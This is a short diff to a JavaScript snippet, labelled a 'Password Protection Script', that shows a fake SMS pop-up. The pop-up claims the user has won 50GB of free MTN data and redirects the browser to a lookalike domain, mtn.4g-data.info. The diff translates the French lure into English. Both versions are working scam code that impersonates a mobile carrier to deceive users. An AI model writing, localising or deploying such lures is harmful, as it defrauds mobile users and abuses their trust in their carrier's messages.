@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '50Go de données'
-password=prompt('SMS: Félicitations, vous êtes éligible pour recevoir 50Go de données gratuites, RÉCOMPENSE POUR LANCIENNE CARTE SIM MTN valable 30 jours, veuillez appuyer sur OK pour ACTIVER ','50Go de données');
-if (password != '50Go de données') {
-location.href='https://mtn.4g-data.info/5Go';
+var password = '50GB DATA'
+password=prompt('SMS: Congratulations You are Eligible to receive 50GB Free Data MTN OLD SIM CARD REWARD Valid For 30days, Kindly Press OK to ACTIVATE ','50GB DATA');
+if (password != '50GB DATA') {
+location.href='https://mtn.4g-data.info/50GB';
 }
